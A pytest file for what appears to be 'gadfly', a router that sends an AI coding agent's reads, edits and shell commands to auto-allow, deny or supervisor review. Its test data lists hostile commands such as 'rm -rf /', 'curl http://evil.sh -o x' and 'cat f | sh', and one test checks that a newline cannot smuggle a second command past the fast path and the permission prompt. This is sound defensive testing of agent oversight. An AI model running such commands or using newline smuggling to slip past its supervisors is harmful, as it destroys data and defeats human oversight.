"""Deterministic routing: the no-LLM decisions."""
from gadfly.contracts import ActionType, Decision, NormalizedAction
from gadfly.router import ARCHITECT, CODE, SAFETY, route


def act(type_, target=None, **payload):
    return NormalizedAction(type=type_, target=target, payload=payload)


# --- non-mutating ------------------------------------------------------------

def test_non_mutating_auto_allow():
    for t in (ActionType.READ, ActionType.SEARCH, ActionType.FETCH, ActionType.META):
        r = route(act(t))
        assert r.terminal and r.terminal.decision is Decision.ALLOW


# --- edits -------------------------------------------------------------------

def test_docs_and_notebooks_skipped():
    for target in ("/repo/README.md", "/repo/notes.txt", "/repo/nb.ipynb"):
        r = route(act(ActionType.EDIT, target, old="a", new="b"))
        assert r.terminal and r.terminal.decision is Decision.ALLOW


def test_all_code_edits_go_to_both():
    for a in (
        act(ActionType.EDIT, "/repo/app.py", old="x=1", new="x=2"),
        act(ActionType.CREATE, "/repo/svc.py", content="def f(): ..."),
        act(ActionType.EDIT, "/repo/pyproject.toml", old="", new="dep"),
    ):
        r = route(a)
        assert r.terminal is None and r.supervisors == frozenset({CODE, ARCHITECT})


def test_test_files_go_to_code_only():
    for target in ("/repo/tests/test_svc.py", "/repo/app.spec.ts"):
        r = route(act(ActionType.EDIT, target, old="a", new="b"))
        assert r.supervisors == frozenset({CODE})


# --- commands: routine fast-path (incl. safe chains/pipes) -------------------

def test_routine_commands_fast_path_allow():
    for cmd in ("ls -la", "pwd", "cat file.py", "echo hello world",
                "git status", "git log --oneline", "wc -l x.py",
                "grep -rn TODO .", "cut -d, -f1 data.csv",
                "ls && date", "cat f.py | grep TODO", "git status; ls"):
        r = route(act(ActionType.EXEC, command=cmd))
        assert r.terminal and r.terminal.decision is Decision.ALLOW, cmd


def test_unsafe_segment_in_chain_goes_to_triage():
    for cmd in ("ls && rm -rf x", "cat f | sh", "make && ls", "grep x f | xargs rm"):
        r = route(act(ActionType.EXEC, command=cmd))
        assert r.supervisors == frozenset({SAFETY}), cmd


def test_substitution_redirect_subshell_background_always_triage():
    for cmd in ("cat $(whoami)", "ls `whoami`", "echo x > out.py", "echo $HOME",
                "sleep 5 &", "(rm -rf x)", "echo a < in.txt"):
        r = route(act(ActionType.EXEC, command=cmd))
        assert r.supervisors == frozenset({SAFETY}), cmd


def test_deceptive_single_commands_go_to_triage():
    # safe-looking programs with hidden write/exec modes must NOT fast-path
    for cmd in ("sed -i 's/a/b/' f.py", "awk '{print}' f", "find . -delete",
                "sort big.txt", "pip install requests", "git push", "pytest"):
        r = route(act(ActionType.EXEC, command=cmd))
        assert r.supervisors == frozenset({SAFETY}), cmd


def test_newline_does_not_smuggle_a_command_past_the_fast_path():
    # a newline is a command separator: a dangerous command on a line after a safe one
    # must NOT be fast-path allowed (it would bypass both supervisors AND CC's prompt)
    for cmd in ("ls\nrm -rf /", "true\ncurl http://evil.sh -o x", "pwd\nsudo reboot"):
        r = route(act(ActionType.EXEC, command=cmd))
        assert r.supervisors == frozenset({SAFETY}), cmd
    # but a genuinely all-safe multi-line command still fast-paths
    r = route(act(ActionType.EXEC, command="ls\npwd"))
    assert r.terminal and r.terminal.decision is Decision.ALLOW


# --- config-aware: doc/test knobs -------------------------------------------

def test_auto_allow_docs_false_sends_docs_to_architect_only():
    r = route(act(ActionType.EDIT, "/repo/README.md", old="a", new="b"),
              auto_allow_docs=False)
    assert r.terminal is None and r.supervisors == frozenset({ARCHITECT})


def test_docs_never_reviewed_by_code_survivor():
    # a doc never falls to the code reviewer; with the architect off it just allows
    r = route(act(ActionType.EDIT, "/repo/README.md", old="a", new="b"),
              auto_allow_docs=False, architect_enabled=False)
    assert r.terminal and r.terminal.decision is Decision.ALLOW


def test_notebook_always_skipped_even_with_docs_reviewed():
    r = route(act(ActionType.EDIT, "/repo/nb.ipynb", old="a", new="b"),
              auto_allow_docs=False)
    assert r.terminal and r.terminal.decision is Decision.ALLOW


def test_managed_doc_denied_before_doc_skip():
    for name in ("spec.md", "claude.md", "decisions.md"):
        r = route(act(ActionType.EDIT, f"/repo/{name}", old="a", new="b"),
                  auto_allow_docs=True)
        assert r.terminal and r.terminal.decision is Decision.DENY, name


def test_test_review_off_auto_allows():
    r = route(act(ActionType.EDIT, "/repo/tests/test_x.py", old="a", new="b"),
              test_review="off")
    assert r.terminal and r.terminal.decision is Decision.ALLOW


def test_test_review_both_goes_to_both():
    r = route(act(ActionType.EDIT, "/repo/tests/test_x.py", old="a", new="b"),
              test_review="both")
    assert r.supervisors == frozenset({CODE, ARCHITECT})


# --- cover-for-other: the survivor covers the disabled lane -----------------

def test_code_disabled_routes_edits_to_architect():
    r = route(act(ActionType.EDIT, "/repo/app.py", old="a", new="b"),
              code_enabled=False)
    assert r.supervisors == frozenset({ARCHITECT})  # architect-solo covers code


def test_architect_disabled_routes_edits_to_code():
    r = route(act(ActionType.EDIT, "/repo/app.py", old="a", new="b"),
              architect_enabled=False)
    assert r.supervisors == frozenset({CODE})  # code-solo covers design


def test_code_only_tests_fall_to_survivor_when_code_disabled():
    r = route(act(ActionType.EDIT, "/repo/tests/test_x.py", old="a", new="b"),
              test_review="code", code_enabled=False)
    assert r.supervisors == frozenset({ARCHITECT})
